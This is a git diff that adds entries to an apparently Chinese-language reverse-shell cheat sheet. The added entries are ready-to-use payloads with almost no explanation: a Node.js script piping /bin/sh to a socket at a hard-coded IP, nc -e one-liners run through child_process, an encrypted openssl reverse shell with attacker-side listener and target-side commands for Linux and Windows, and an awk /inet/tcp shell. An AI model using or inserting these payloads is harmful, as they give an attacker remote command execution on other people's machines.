@@ -125,6 +125,74 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 ```
 
 
+Nodejs
+
+```javascript
+
+
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(8080, "10.17.26.64", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
+
+or
+
+require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
+
+or
+
+-var x = global.process.mainModule.require
+-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')
+
+
+```
+
+用openssl 反弹shell
+
+
+攻击者
+
+```bash
+
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
+openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
+openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
+
+```
+
+靶机
+
+```bash
+#Linux
+openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
+
+#Windows
+openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
+
+```
+
+
+
+
+```bash
+
+awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+```
+
+
+
+
+
 
 在带有公网的机器上开启监听
 
